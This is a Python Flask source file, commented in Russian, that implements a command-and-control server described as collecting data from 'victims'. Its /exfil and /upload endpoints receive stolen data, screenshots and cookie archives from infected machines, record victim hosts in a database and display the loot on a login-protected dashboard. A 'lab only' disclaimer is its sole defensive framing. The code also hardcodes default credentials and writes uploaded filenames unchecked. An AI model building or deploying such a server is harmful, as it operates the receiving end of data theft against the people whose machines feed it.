#!/usr/bin/env python3
"""
C2 Server для приема данных от жертв
Flask + SQLite + Web-интерфейс
Адаптировано из GhostPipe и Bloodhound-C2 проектов
ТОЛЬКО ДЛЯ ЛАБОРАТОРНЫХ ИССЛЕДОВАНИЙ!
"""

import os
import sqlite3
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
from functools import wraps

app = Flask(__name__)
app.secret_key = "CHANGE_THIS_IN_PRODUCTION_LAB_ONLY"

# Конфигурация
DB_PATH = "c2_data.db"
UPLOAD_DIR = "uploads"
PORT = 8084

os.makedirs(UPLOAD_DIR, exist_ok=True)

# ========== Инициализация базы данных ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Таблица агентов (жертв)
    c.execute('''CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT UNIQUE,
        ip TEXT,
        first_seen TIMESTAMP,
        last_seen TIMESTAMP,
        os_info TEXT,
        computer_name TEXT,
        username TEXT
    )''')
    
    # Таблица данных (собранная информация)
    c.execute('''CREATE TABLE IF NOT EXISTS exfiltrated_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        data_type TEXT,
        data TEXT,
        received_at TIMESTAMP,
        FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
    )''')
    
    # Таблица файлов (скриншоты, архивы)
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        filename TEXT,
        filepath TEXT,
        size INTEGER,
        received_at TIMESTAMP
    )''')
    
    # Простая аутентификация для веб-интерфейса
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    
    # Создаем дефолтного пользователя (admin / admin)
    c.execute("SELECT * FROM users WHERE username='admin'")
    if not c.fetchone():
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
                  ("admin", "admin_lab_2026"))
    
    conn.commit()
    conn.close()

# ========== Декоратор аутентификации ==========
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ========== API для приема данных от агентов ==========
@app.route('/exfil', methods=['POST'])
def exfiltrate():
    """Принимает данные от жертвы"""
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON data"}), 400
    
    agent_id = request.remote_addr
    received_at = datetime.now()
    
    # Получаем или создаем агента
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT * FROM agents WHERE agent_id=?", (agent_id,))
    agent = c.fetchone()
    
    if not agent:
        c.execute("""INSERT INTO agents (agent_id, ip, first_seen, last_seen) 
                     VALUES (?, ?, ?, ?)""",
                  (agent_id, request.remote_addr, received_at, received_at))
    else:
        c.execute("UPDATE agents SET last_seen=? WHERE agent_id=?", 
                  (received_at, agent_id))
    
    # Сохраняем данные
    data_type = data.get('type', 'unknown')
    data_content = data.get('data', '')
    
    c.execute("""INSERT INTO exfiltrated_data (agent_id, data_type, data, received_at)
                 VALUES (?, ?, ?, ?)""",
              (agent_id, data_type, data_content, received_at))
    
    conn.commit()
    conn.close()
    
    print(f"[+] Received data from {agent_id}: {data_type} ({len(data_content)} bytes)")
    return jsonify({"status": "ok"}), 200

@app.route('/upload', methods=['POST'])
def upload_file():
    """Принимает файлы (скриншоты, архивы cookies)"""
    agent_id = request.remote_addr
    
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "Empty filename"}), 400
    
    # Сохраняем файл
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{agent_id}_{timestamp}_{file.filename}"
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)
    
    size = os.path.getsize(filepath)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO files (agent_id, filename, filepath, size, received_at)
                 VALUES (?, ?, ?, ?, ?)""",
              (agent_id, file.filename, filepath, size, datetime.now()))
    conn.commit()
    conn.close()
    
    print(f"[+] Received file from {agent_id}: {file.filename} ({size} bytes)")
    return jsonify({"status": "ok"}), 200

# ========== Web-интерфейс ==========
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server Login</title>
    <style>
        body { font-family: monospace; background: #0a0f1e; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login { background: #1a2a3a; padding: 40px; border-radius: 16px; box-shadow: 0 0 20px rgba(0,255,255,0.2); }
        input { display: block; margin: 15px 0; padding: 10px; width: 250px; background: #0a0f1e; border: 1px solid #00ffff; color: #00ffff; }
        button { background: #00ffff; color: #000; padding: 10px 20px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login">
        <h2>C2 Server Access</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

DASHBOARD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #0a0f1e; color: #0f0; padding: 20px; }
        h1 { color: #0ff; margin-bottom: 20px; }
        .card { background: #1a2a3a; border-radius: 12px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #0ff; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #2a3a4a; }
        th { color: #0ff; }
        .data-box { background: #0a0f1e; padding: 10px; font-family: monospace; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
        .nav { margin-bottom: 20px; }
        .nav a { color: #0ff; margin-right: 15px; }
        .logout { color: #f00; float: right; }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">🏠 Dashboard</a>
        <a href="/agents">🖥️ Agents</a>
        <a href="/data">📊 Exfiltrated Data</a>
        <a href="/files">📁 Files</a>
        <a href="/logout" class="logout">🚪 Logout</a>
    </div>
    
    <h1>🎯 C2 Command & Control Dashboard</h1>
    
    <div class="card">
        <h3>📊 Statistics</h3>
        <table>
            <tr><th>Total Agents</th><td>{{ agents_count }}</td></tr>
            <tr><th>Total Data Records</th><td>{{ data_count }}</td></tr>
            <tr><th>Total Files</th><td>{{ files_count }}</td></tr>
            <tr><th>Last Activity</th><td>{{ last_activity }}</td></tr>
        </table>
    </div>
    
    <div class="card">
        <h3>🖥️ Recent Agents</h3>
        <table>
            <tr><th>Agent ID</th><th>First Seen</th><th>Last Seen</th><th>Computer</th></tr>
            {% for agent in agents %}
            <tr>
                <td>{{ agent[1] }}</td>
                <td>{{ agent[3] }}</td>
                <td>{{ agent[4] }}</td>
                <td>{{ agent[6] or '-' }}</td>
            </tr>
            {% endfor %}
        </table>
    </div>
    
    <div class="card">
        <h3>📨 Latest Exfiltrated Data</h3>
        {% for d in latest_data %}
        <div class="data-box">
            <b>[{{ d[4] }}] {{ d[2] }} from {{ d[1] }}</b><br>
            {{ d[3][:500] }}{% if d[3]|length > 500 %}...{% endif %}
        </div>
        <hr>
        {% endfor %}
    </div>
</body>
</html>
'''

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username=? AND password=?", 
                  (username, password))
        user = c.fetchone()
        conn.close()
        
        if user:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
    
    return render_template_string(LOGIN_PAGE)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    agents_count = c.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
    data_count = c.execute("SELECT COUNT(*) FROM exfiltrated_data").fetchone()[0]
    files_count = c.execute("SELECT COUNT(*) FROM files").fetchone()[0]
    
    agents = c.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 10").fetchall()
    latest_data = c.execute("""
        SELECT * FROM exfiltrated_data 
        ORDER BY received_at DESC LIMIT 10
    """).fetchall()
    
    last_activity_row = c.execute("""
        SELECT MAX(received_at) FROM exfiltrated_data
    """).fetchone()
    last_activity = last_activity_row[0] if last_activity_row[0] else "No data"
    
    conn.close()
    
    return render_template_string(DASHBOARD_PAGE, 
                                  agents_count=agents_count,
                                  data_count=data_count,
                                  files_count=files_count,
                                  agents=agents,
                                  latest_data=latest_data,
                                  last_activity=last_activity)

@app.route('/agents')
@login_required
def agents():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    agents = c.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()
    
    html = '''
    <!DOCTYPE html>
    <html><head><title>Agents</title><style>body{background:#0a0f1e;color:#0f0;font-family:monospace;}</style></head>
    <body><a href="/">← Back</a><h1>Agents</h1><table border="1">'''
    
    for a in agents:
        html += f'<tr><td>{a[1]}</td><td>{a[3]}</td><td>{a[4]}</td><td>{a[6] or "-"}</td></tr>'
    
    html += '</table></body></html>'
    return html

@app.route('/data')
@login_required
def data():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    data = c.execute("SELECT * FROM exfiltrated_data ORDER BY received_at DESC LIMIT 100").fetchall()
    conn.close()
    
    html = '''
    <!DOCTYPE html>
    <html><head><title>Exfiltrated Data</title><style>body{background:#0a0f1e;color:#0f0;font-family:monospace;}.item{background:#1a2a3a;margin:10px;padding:10px;}</style></head>
    <body><a href="/">← Back</a><h1>Exfiltrated Data</h1>'''
    
    for d in data:
        html += f'<div class="item"><b>[{d[4]}] {d[2]} from {d[1]}</b><br><pre>{d[3][:1000]}</pre></div>'
    
    html += '</body></html>'
    return html

@app.route('/files')
@login_required
def files():
    import os
    files_list = os.listdir(UPLOAD_DIR)
    html = '''
    <!DOCTYPE html>
    <html><head><title>Files</title><style>body{background:#0a0f1e;color:#0f0;font-family:monospace;}</style></head>
    <body><a href="/">← Back</a><h1>Uploaded Files</h1><ul>'''
    
    for f in files_list:
        html += f'<li><a href="/download/{f}">{f}</a></li>'
    
    html += '</ul></body></html>'
    return html

@app.route('/download/<filename>')
@login_required
def download_file(filename):
    from flask import send_file
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return "File not found", 404

if __name__ == '__main__':
    init_db()
    print("="*50)
    print("C2 Server started!")
    print(f"Web interface: http://localhost:{PORT}")
    print(f"Exfil endpoint: POST http://localhost:{PORT}/exfil")
    print(f"Upload endpoint: POST http://localhost:{PORT}/upload")
    print("Credentials: admin / admin_lab_2026")
    print("="*50)
    app.run(host='0.0.0.0', port=PORT, debug=False)
